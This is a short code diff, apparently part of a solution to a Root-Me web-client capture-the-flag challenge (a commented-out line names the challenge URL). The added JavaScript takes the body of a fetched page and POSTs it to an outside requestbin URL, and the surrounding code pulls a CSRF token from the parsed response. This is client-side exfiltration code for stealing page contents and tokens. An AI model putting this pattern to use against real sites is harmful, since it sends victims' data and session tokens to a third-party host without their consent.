@@ -8,6 +8,16 @@ function readBody(xhr) {
     } else {
         data = xhr.response;
     }
+
+    var x1 = new XMLHttpRequest();
+    //x1.open("POST", 'http://challenge01.root-me.org/web-client/ch23/?action=profile');
+    x1.open("POST", 'http://requestbin.fullcontact.com/11n8ai91');
+    var sendWidgetModel = {
+    	'body': data
+    }
+    x1.send(sendWidgetModel);
+
+
     var parser = new DOMParser();
     var resp = parser.parseFromString(data, "text/html");
     token = resp.getElementsByName('token')[0].value; //grab first available token
